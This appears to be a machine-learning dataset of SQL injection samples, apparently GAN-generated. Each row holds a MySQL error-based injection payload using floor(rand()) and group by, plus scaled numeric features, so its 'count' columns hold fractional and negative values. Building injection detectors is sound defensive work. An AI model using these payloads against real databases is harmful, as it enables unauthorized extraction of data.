id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001236,attack,error,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",nearest_attack_euclidean,R000126,7.186749408423361,357.1062316894531,90.83208465576172,54.96503448486328,149.02064514160156,-14.533263206481934,111.27816009521484,36.268470764160156,0.2867925763130188,0.4077528119087219,0.13777735829353333,0.3803066611289978,0.10197670012712479,4.023972988128662,3.051115036010742,2.1633803844451904,0.509678840637207,0.32846400141716003,0.09527459740638733,-0.5248683094978333,12.356290817260742,10.389313697814941,6.971680641174316,0.2219066321849823,2.27482533454895,0.2627429664134979,-0.5226715803146362,0.21169984340667725,-0.07593373209238052,2.3325116634368896,-0.445512980222702,0.20663303136825562,0.8233898878097534,-0.5166393518447876,0.35452014207839966,2.679408550262451,6.580375671386719,0.6012647747993469,5.783743858337402,1.998957872390747,-0.06883405894041061,0.6863524913787842,-0.2601785361766815,-0.0965379998087883,0.5810320973396301,0.6738373637199402,-0.0680583119392395,0.28640908002853394,0.6469883918762207,0.469696044921875,0.10353190451860428,0.007225652690976858,-0.6903781890869141,0.23983067274093628,1.6018747091293335,0.23690468072891235,0.3483513593673706,0.8122250437736511,0.03268305957317352,-0.0373462475836277,0.6674922704696655,0.9180275201797485,-1.3086600303649902,-0.04239969700574875,-0.026820579543709755,0.5345276594161987,0.3398592174053192,-1.0652726888656616,0.7028822302818298,-0.8024160265922546,-1.2921466827392578,-0.4436942934989929,-0.1379823237657547,-0.5161560773849487,-0.008719570934772491,-0.7361013889312744,1.7416362762451172,0.4251039922237396,0.25725698471069336,0.1003362312912941,1.3627619743347168,9.551833152770996,0.629187285900116,0.19914108514785767,0.13380824029445648,0.561871349811554,0.32322266697883606,0.10109958797693253,1.0955090522766113
GAN_001237,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.119367191745173,320.46240234375,98.60053253173828,42.72352981567383,123.37661743164062,-10.453383445739746,104.64472961425781,31.707334518432617,0.5622502565383911,0.4254291355609894,0.13308030366897583,0.379006564617157,0.11011803895235062,3.933668375015259,2.4823808670043945,1.5993497371673584,0.4188433587551117,0.11233196407556534,0.17859108746051788,-0.05141535401344299,12.30963134765625,8.54411506652832,6.288017749786377,0.03878186643123627,2.2120304107666016,0.07188127934932709,-0.3733084499835968,0.02955978736281395,-0.15410202741622925,1.684743046760559,-0.5922904014587402,-0.03344529867172241,1.3718494176864624,-0.07762511819601059,0.17045551538467407,2.5124573707580566,6.22768497467041,1.2400307655334473,3.673691749572754,1.1239848136901855,0.053470827639102936,0.838659942150116,-0.34529703855514526,-0.04860842972993851,0.07163093239068985,0.5848612189292908,0.15103957056999207,0.165260449051857,0.6825154423713684,0.09870966523885727,0.2674174904823303,-0.0020680527668446302,-0.5463442802429199,-0.09198075532913208,1.2499507665634155,0.22639809548854828,0.17246103286743164,0.6253456473350525,-0.43241605162620544,0.03742964193224907,0.5353456139564514,-0.05525742471218109,-1.036407470703125,0.008919376879930496,-0.07266230136156082,0.675940215587616,0.5950486063957214,-0.9025647044181824,0.9087541699409485,-0.6983340978622437,-1.3321269750595093,-0.6323349475860596,-0.010270502418279648,-0.30547693371772766,-0.0260588638484478,-0.746105968952179,1.421596884727478,0.4952046573162079,0.02430245652794838,-0.01767697185277939,1.18520188331604,9.95110034942627,0.6445108652114868,-0.003811243223026395,0.16876320540905,0.4567784368991852,-0.13493037223815918,-0.3505341708660126,0.3673163652420044
GAN_001238,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.426845762705691,284.89385986328125,80.20043182373047,40.49873352050781,122.51171875,-4.074008941650391,81.53327941894531,29.1514949798584,0.5584129691123962,0.3896341919898987,0.14273087680339813,0.40109843015670776,0.11800146847963333,3.8233931064605713,1.6832066774368286,1.265639305114746,0.6684328317642212,0.3834632337093353,0.24505899846553802,-0.23886588215827942,10.564263343811035,9.469008445739746,5.427711486816406,-0.12370415031909943,2.3332042694091797,0.06541149318218231,-0.3579033315181732,-0.30510184168815613,-0.17883718013763428,1.0739179849624634,-0.4510679543018341,-0.00042092055082321167,1.6689480543136597,-0.5045613050460815,0.444244921207428,2.4149436950683594,5.9032087326049805,1.189013957977295,4.147002696990967,1.4647762775421143,-0.027579866349697113,0.3245125710964203,-0.3829578161239624,-0.014911460690200329,-0.07261782139539719,0.377363920211792,0.23849481344223022,0.14284373819828033,0.6412010192871094,0.228245347738266,0.22033379971981049,-0.002478222129866481,-0.3204401731491089,0.061542242765426636,0.9922480583190918,0.20135894417762756,0.2411375492811203,0.6764358282089233,-0.4732348918914795,0.0064093805849552155,0.3473926782608032,0.3060867190361023,-0.608669102191925,0.17465271055698395,-0.09282712638378143,0.30250808596611023,0.5940941572189331,-0.9659436345100403,0.6217644214630127,-0.8555545210838318,-1.098714828491211,-0.29753854870796204,0.22189141809940338,-0.6452891826629639,-0.007196397054940462,-0.1801169216632843,1.353182077407837,0.7094932198524475,-0.019411388784646988,0.03316526859998703,1.000177264213562,10.848560333251953,0.73434978723526,-0.064324289560318,0.123601533472538,0.31656473875045776,0.3056071102619171,-0.24159130454063416,0.3501123785972595
GAN_001239,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,6.64647017298787,347.9140930175781,85.35633850097656,56.16516876220703,148.57760620117188,-7.419221878051758,106.78113555908203,38.532100677490234,0.3209577798843384,0.3957248628139496,0.1439216285943985,0.38974735140800476,0.1033516451716423,3.9482169151306152,2.345519542694092,1.782729148864746,0.8397579789161682,0.34124234318733215,0.24382257461547852,-0.2148006558418274,12.356218338012695,11.043214797973633,6.330966472625732,0.17810364067554474,2.2033417224884033,0.3270575702190399,-0.3387833535671234,0.01807023212313652,-0.08597832173109055,2.1234805583953857,-0.09443886578083038,0.2123042345046997,1.149898886680603,-0.48410564661026,0.37241148948669434,2.710280418395996,6.531665802001953,0.39605966210365295,5.776512622833252,2.0597119331359863,0.0070688496343791485,0.6473162770271301,-0.21585096418857574,-0.08788363635540009,0.6846515536308289,0.3769514858722687,-0.2677439749240875,0.26594918966293335,0.5589827299118042,0.5177999138832092,0.13146042823791504,0.09059544652700424,-0.4971572160720825,0.3795509338378906,1.3888370990753174,0.193426713347435,0.38381513953208923,0.8249084949493408,-0.07111772894859314,-0.21064524352550507,0.6873340606689453,0.9321946501731873,-1.0597232580184937,-0.054001130163669586,-0.015222983434796333,0.47823745012283325,0.3021038770675659,-0.9087756872177124,0.40853309631347656,-0.7015253901481628,-1.1601498126983643,-0.30606815218925476,-0.12519767880439758,-0.4342418611049652,-0.008291007950901985,-0.3911793828010559,1.6018147468566895,0.6557063460350037,-0.05300908535718918,0.10477084666490555,1.1377968788146973,10.069543838500977,0.7776583433151245,0.2649215757846832,0.11879058927297592,0.47760677337646484,0.774298906326294,-0.019677501171827316,0.6623177528381348
GAN_001240,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.822484979242729,291.6416015625,92.84247589111328,48.610782623291016,124.71635437011719,-9.272248268127441,101.71080780029297,35.15830993652344,0.4755987524986267,0.38499999046325684,0.14149577915668488,0.39555296301841736,0.11127170920372009,3.8714046478271484,2.5061705112457275,1.544185996055603,0.6076475381851196,0.2064710408449173,0.03788507729768753,-0.13200059533119202,12.070064544677734,9.92664623260498,6.025763511657715,0.5286170840263367,2.0597567558288574,0.3303926885128021,-0.5039914846420288,0.14804738759994507,0.029506824910640717,1.757739543914795,-0.32358014583587646,0.11096884310245514,1.4041472673416138,-0.22593237459659576,0.23731650412082672,2.5431246757507324,6.624614715576172,0.9016266465187073,4.330467224121094,0.9135475158691406,0.21327835321426392,0.9238804578781128,-0.29868343472480774,-0.04271909222006798,0.04505932331085205,0.30322930216789246,0.11970601975917816,0.24974612891674042,0.5648798942565918,0.369627982378006,0.22174951434135437,0.14077910780906677,-0.43035784363746643,0.25075674057006836,1.0565426349639893,0.18878506124019623,0.14386679232120514,0.7434018850326538,-0.12176193296909332,0.22203876078128815,0.5148345232009888,0.3677293658256531,-0.7326532006263733,0.1833689957857132,-0.01702621392905712,0.44063860177993774,0.41807132959365845,-0.5552828907966614,0.5342398881912231,-0.5456058382987976,-0.7221329212188721,-0.3732103705406189,0.04506551846861839,-0.07434535026550293,-0.01909627951681614,-0.31832441687583923,1.5011793375015259,0.5180806517601013,0.2580285966396332,0.16561107337474823,0.8904938697814941,9.45228099822998,0.68354731798172,0.15470105409622192,0.1171998605132103,0.547875702381134,0.027862228453159332,-0.16548825800418854,0.5604335069656372
GAN_001241,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,6.109106906604732,311.8837890625,91.80730438232422,44.58865737915039,121.85687255859375,-5.403321266174316,102.03348541259766,33.34201431274414,0.6306613683700562,0.3951215147972107,0.14148098230361938,0.3969249725341797,0.11481378972530365,3.9163365364074707,2.033677339553833,1.6622601747512817,0.7577592134475708,0.2224738746881485,0.03990697115659714,-0.1581217646598816,11.378185272216797,9.22967529296875,5.760614395141602,0.3000393509864807,2.0895328521728516,0.24712467193603516,-0.38499441742897034,-0.0742359608411789,-0.09107593446969986,1.7572627067565918,-0.01811334118247032,0.17803584039211273,1.3965476751327515,-0.4496117830276489,0.16550812125205994,2.5784788131713867,6.212552547454834,0.7418134808540344,4.2972002029418945,1.0030431747436523,0.03792128711938858,0.7536227703094482,-0.4432314336299896,-0.004877601750195026,0.27331340312957764,0.45083609223365784,0.11064769327640533,0.27119606733322144,0.5163499712944031,0.2587442100048065,0.11928936094045639,-0.07099104672670364,-0.5237838625907898,0.3321828544139862,1.2543048858642578,0.16723813116550446,0.20653176307678223,0.8828166723251343,-0.1948041319847107,-0.01878420077264309,0.6544504165649414,0.2602901756763458,-0.8961732387542725,-0.006556730717420578,-0.02860291488468647,0.3838838040828705,0.4115650951862335,-0.9497012495994568,0.7128134965896606,-0.7207726836204529,-0.9669470191001892,-0.5846821069717407,-0.324067085981369,-0.40172794461250305,-0.031197205185890198,-0.44752606749534607,1.559606909751892,0.7206343412399292,-0.10864250361919403,0.12097682058811188,0.838570773601532,8.507308959960938,0.9304341673851013,0.07014718651771545,0.16530314087867737,0.4239533543586731,0.12750855088233948,-0.14870582520961761,0.41124972701072693
GAN_001242,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.207890971875762,292.7982177734375,93.22911834716797,43.28398895263672,119.73636627197266,-6.51930046081543,97.73385620117188,33.08616638183594,0.5662501454353333,0.3733636736869812,0.15081925690174103,0.3909839689731598,0.12185859680175781,3.8954732418060303,2.186195135116577,1.3104087114334106,0.41303059458732605,0.1679440140724182,0.11793015152215958,-0.018167899921536446,10.794411659240723,9.126890182495117,5.584475994110107,0.43480759859085083,2.0040738582611084,0.16557374596595764,-0.31275123357772827,0.12068136036396027,-0.10630650073289871,1.5301569700241089,-0.40185433626174927,0.1453298181295395,1.6475552320480347,-0.42205286026000977,0.21734991669654846,2.383653402328491,6.820542335510254,0.8091254234313965,3.58492112159729,1.0512715578079224,0.07759348303079605,0.7992678284645081,-0.2819065451622009,-0.05719722807407379,-0.014119746163487434,0.20321927964687347,0.1201574057340622,0.32338425517082214,0.5626081228256226,0.2423221319913864,0.28188490867614746,0.09385230392217636,-0.34265488386154175,0.17376504838466644,1.0088187456130981,0.19503216445446014,0.18646444380283356,0.560264527797699,-0.25440940260887146,0.11754081398248672,0.2836587429046631,0.09017304331064224,-0.419571191072464,0.11851032078266144,-0.0015874378150328994,0.30223390460014343,0.615066409111023,-0.21172857284545898,0.4939156770706177,-0.44419899582862854,-0.8524537682533264,-0.22761547565460205,0.013382989913225174,-0.06965247541666031,-0.026018977165222168,-0.29351991415023804,1.3188917636871338,0.5877602100372314,-0.05210759863257408,0.00801804568618536,0.8809508085250854,9.997103691101074,0.7486162185668945,0.13197393715381622,0.10270349681377411,0.6142596006393433,-0.14215287566184998,-0.21186275780200958,0.11328385770320892
GAN_001243,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.351628911755121,312.7852478027344,91.0665512084961,43.88836669921875,129.94126892089844,-9.879942893981934,99.26715850830078,33.457611083984375,0.1807861328125,0.40361642837524414,0.14645586907863617,0.38242587447166443,0.11673209816217422,3.9811153411865234,2.1461007595062256,1.7803341150283813,0.4424978196620941,0.33162426948547363,0.20673753321170807,-0.47418925166130066,11.520569801330566,7.646681785583496,6.26402473449707,0.5761916637420654,1.97365140914917,0.1635102927684784,-0.4810069501399994,-0.15408776700496674,-0.2521417438983917,1.7609342336654663,-0.504608690738678,0.19947749376296997,1.456418514251709,-0.4943544268608093,0.16701893508434296,2.718973398208618,5.682153224945068,0.9520016312599182,4.812870502471924,1.6182068586349487,-0.12857308983802795,0.733801007270813,-0.4899420738220215,-0.07981602102518082,-0.027968887239694595,0.5673561692237854,0.30582311749458313,0.18558447062969208,0.631858766078949,0.3208743631839752,0.13285017013549805,-0.2730666697025299,-0.6019493937492371,0.07876992970705032,1.2608239650726318,0.27397462725639343,0.4421738386154175,0.9378247261047363,-0.5848675966262817,0.09683151543140411,0.7282566428184509,0.45506155490875244,-0.7171297669410706,0.3785684406757355,-0.051883041858673096,0.3752724826335907,0.42568185925483704,-0.3810890316963196,0.6994609236717224,-1.0476807355880737,-1.1427377462387085,-0.3168084919452667,-0.06828972697257996,-0.25287145376205444,-0.04699452221393585,-0.13797622919082642,1.5237669944763184,0.9190000891685486,-0.3458273708820343,0.026755183935165405,1.083786964416504,9.25342082977295,0.9418677687644958,0.054159339517354965,0.09781546890735626,0.4602796733379364,0.3502979576587677,-0.2689822316169739,0.4572814702987671
GAN_001244,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.218872490220562,300.30706787109375,86.39747619628906,39.01506042480469,119.09386444091797,-7.6294755935668945,89.29883575439453,30.741931915283203,0.727526843547821,0.4043010175228119,0.1274024248123169,0.3926527798175812,0.1200532391667366,3.8602066040039062,2.0398647785186768,1.0689464807510376,0.6406477689743042,0.3116517663002014,0.23647639155387878,-0.3547424376010895,10.881229400634766,8.503531455993652,5.453980922698975,-0.0546766072511673,2.3506171703338623,0.09708172082901001,-0.4974483847618103,-0.17160700261592865,-0.14080122113227844,1.3316738605499268,-0.248410165309906,0.011498931795358658,1.5679396390914917,-0.5119391083717346,0.30718258023262024,2.5010321140289307,5.7155985832214355,1.0253320932388306,4.268884658813477,1.317160964012146,-0.026856593787670135,0.6349371671676636,-0.6002074480056763,-0.00942941289395094,0.09411995857954025,0.6362472772598267,-0.01429693028330803,0.13396842777729034,0.6157559156417847,0.25071337819099426,0.2208699733018875,-0.11503542214632034,-0.431835800409317,0.3402716815471649,1.1135400533676147,0.17570623755455017,0.16042368113994598,0.6836479306221008,-0.3735964596271515,-0.020849818363785744,0.5889183878898621,0.5184475183486938,-0.559527575969696,-0.12289270758628845,-0.09343346208333969,0.1851000189781189,0.5332797169685364,-1.0949801206588745,0.6284855008125305,-0.8143376111984253,-1.1251083612442017,-0.5503542423248291,0.10693477094173431,-0.8328157663345337,-0.018634643405675888,-0.3519439399242401,1.4959689378738403,0.6619782447814941,0.02965172752737999,0.06768718361854553,1.024781346321106,10.218643188476562,0.8559565544128418,-0.09099149703979492,0.13423751294612885,0.3747536838054657,0.09944425523281097,-0.16188065707683563,0.45191457867622375
GAN_001245,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.178817878683689,304.6307067871094,91.5589370727539,45.34355926513672,121.80044555664062,-3.966020345687866,93.52723693847656,35.87963104248047,0.7181863188743591,0.3662903308868408,0.15496356785297394,0.3979967534542084,0.11712706089019775,3.864081382751465,2.1750855445861816,1.0536967515945435,0.6613132357597351,0.13807354867458344,-0.009684905409812927,0.048593826591968536,10.74087142944336,10.485939025878906,5.491011619567871,0.42647579312324524,1.924404501914978,0.28572556376457214,-0.3005960285663605,0.258179247379303,0.018739521503448486,1.4399070739746094,-0.10104864835739136,0.08494515717029572,1.6528644561767578,-0.36817666888237,0.254420667886734,2.413825035095215,7.608763694763184,0.7683754563331604,4.090460300445557,0.7123447060585022,0.23809297382831573,0.8636438846588135,-0.2615732252597809,-0.050939127802848816,0.21482357382774353,0.3043769896030426,-0.012843172997236252,0.289164274930954,0.4353369474411011,0.4567529559135437,0.23980291187763214,0.18797047436237335,-0.40355485677719116,0.30186548829078674,0.9905620217323303,0.13805744051933289,0.14437924325466156,0.3691420257091522,-0.22834351658821106,-0.08238661289215088,0.3740849494934082,0.33560097217559814,-0.2987523376941681,-0.12054575979709625,-0.002385398605838418,0.15700548887252808,0.61321622133255,-0.4452173709869385,0.3144591748714447,-0.3887155055999756,-0.5574237108230591,-0.3460915982723236,0.06589069962501526,-0.18403242528438568,-0.008654161356389523,-0.12126945704221725,1.3811787366867065,0.48655980825424194,0.07244691252708435,0.08954111486673355,0.69512540102005,9.87225341796875,0.7146724462509155,0.2619572579860687,0.120924212038517,0.6088962554931641,-0.0678631067276001,-0.04658271372318268,0.25073009729385376
GAN_001246,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,6.060811323918121,314.0345764160156,93.23113250732422,50.520084381103516,125.98985290527344,-10.777536392211914,100.63355255126953,34.67010498046875,0.460060715675354,0.3837156891822815,0.1352853626012802,0.3833397328853607,0.11227277666330338,3.980480909347534,2.2826712131500244,1.7581509351730347,0.6148538589477539,0.1333501636981964,0.34919610619544983,-0.574164628982544,12.164481163024902,9.790766716003418,5.738977432250977,0.46089980006217957,2.0537102222442627,0.32217007875442505,-0.2204461246728897,0.06795679777860641,0.05440785735845566,1.9529063701629639,-0.16917960345745087,0.12405657768249512,1.4644536972045898,-0.2665575444698334,0.23026350140571594,2.719327449798584,6.702146053314209,0.5800338387489319,4.853561878204346,1.4255667924880981,-0.008588635362684727,0.7871100306510925,-0.3057180345058441,-0.080537348985672,0.38176417350769043,0.4798922538757324,-0.11009334027767181,0.30802446603775024,0.5377518534660339,0.4439498782157898,0.1140703484416008,0.16347377002239227,-0.3769305944442749,0.41865405440330505,1.2077529430389404,0.18077734112739563,0.2075117975473404,0.6524139046669006,-0.10594561696052551,-0.009375917725265026,0.41231438517570496,0.515432596206665,-0.6328020095825195,0.054268401116132736,-0.04723985493183136,0.5800617337226868,0.3715108036994934,-0.7151322960853577,0.4748685657978058,-0.5157995223999023,-0.773654043674469,-0.5355788469314575,-0.1784658133983612,-0.1614702343940735,-0.02193329855799675,-0.4281579554080963,1.6604808568954468,0.5996411442756653,0.2816357910633087,0.1059865802526474,0.898650050163269,9.296789169311523,0.810263454914093,0.26082462072372437,0.10702015459537506,0.5097892880439758,0.13642790913581848,-0.09130571782588959,0.5916127562522888
GAN_001247,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,6.684749894122715,318.4849853515625,87.8073959350586,54.622684478759766,133.31253051757812,-10.787683486938477,109.67488098144531,37.54230499267578,0.35643017292022705,0.40615200996398926,0.13877354562282562,0.40849900245666504,0.10645698010921478,3.8598146438598633,2.553563356399536,1.8647719621658325,0.9552024006843567,0.2840234637260437,0.16941304504871368,-0.23553414642810822,12.29213809967041,11.041501998901367,7.341087341308594,0.4529164731502533,2.1156208515167236,0.41038426756858826,-0.3972616493701935,0.03794122859835625,-0.052040137350559235,2.0574934482574463,-0.5238826274871826,0.09216183423995972,1.354440689086914,-0.5703496336936951,0.37247684597969055,2.832166910171509,6.724321365356445,0.30714908242225647,5.553711414337158,1.339888334274292,0.10752806812524796,0.5876525044441223,-0.29951414465904236,-0.03923064470291138,0.3852156400680542,0.18958935141563416,0.051441870629787445,0.22418512403964996,0.5310168862342834,0.4216082990169525,0.16232021152973175,0.09518327564001083,-0.6085065603256226,0.19614823162555695,1.3418315649032593,0.2985036373138428,0.15206722915172577,0.8008139133453369,-0.1617770791053772,0.34334099292755127,0.58255535364151,0.8163983821868896,-1.0158107280731201,0.021860376000404358,-0.04007904231548309,0.6227126717567444,0.3101038932800293,-0.8253948092460632,0.7609858512878418,-0.6872942447662354,-0.6885471940040588,-0.6690433025360107,-0.03220429643988609,-0.4494283199310303,-0.039521098136901855,-0.38572439551353455,1.4900041818618774,0.6635526418685913,0.37674814462661743,0.17704907059669495,0.8600284457206726,10.212334632873535,0.8050180673599243,0.1951511651277542,0.1605730950832367,0.5161897540092468,0.4227573871612549,-0.31655004620552063,0.7571512460708618
GAN_001248,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.913883089103319,294.96893310546875,85.6121597290039,37.4360237121582,109.38150024414062,-8.386787414550781,87.36577606201172,31.458541870117188,0.45298171043395996,0.39329496026039124,0.15025901794433594,0.3811727464199066,0.1267556995153427,3.94132137298584,2.114128351211548,1.253791332244873,0.5077627301216125,0.26133453845977783,0.25734463334083557,-0.2807459533214569,9.879820823669434,6.713381767272949,5.518380165100098,0.3742430508136749,2.09072208404541,0.055169399827718735,-0.35410505533218384,-0.31226488947868347,-0.11239459365606308,1.2059756517410278,-0.32736581563949585,-0.015065837651491165,1.6737642288208008,-0.39112967252731323,0.10099759697914124,2.54447340965271,5.215766429901123,1.255605697631836,3.634770393371582,1.1879477500915527,-0.06649666279554367,0.7345993518829346,-0.35419467091560364,-0.020797399803996086,-0.2837989628314972,0.8296696543693542,0.2622280418872833,0.1982208788394928,0.5073691010475159,0.1594545692205429,0.09068199247121811,-0.12317708879709244,-0.39718398451805115,0.09217672795057297,0.993122398853302,0.12770044803619385,0.2152193784713745,0.7081354260444641,-0.5811294317245483,0.1394125521183014,0.3140454590320587,0.15277957916259766,-0.5465070009231567,0.02331383153796196,-0.08172557502985,0.5425563454627991,0.5893381834030151,-0.734345555305481,0.8179463744163513,-0.8786923289299011,-1.0040879249572754,-0.35043495893478394,-0.3196527063846588,-0.5487019419670105,-0.03726256638765335,-0.3934648334980011,1.4492652416229248,0.7988336682319641,-0.20743650197982788,0.0410112664103508,0.8098772764205933,8.169319152832031,0.9320453405380249,-0.13284528255462646,0.1514657735824585,0.40822410583496094,0.032705992460250854,-0.42246538400650024,0.3019677996635437
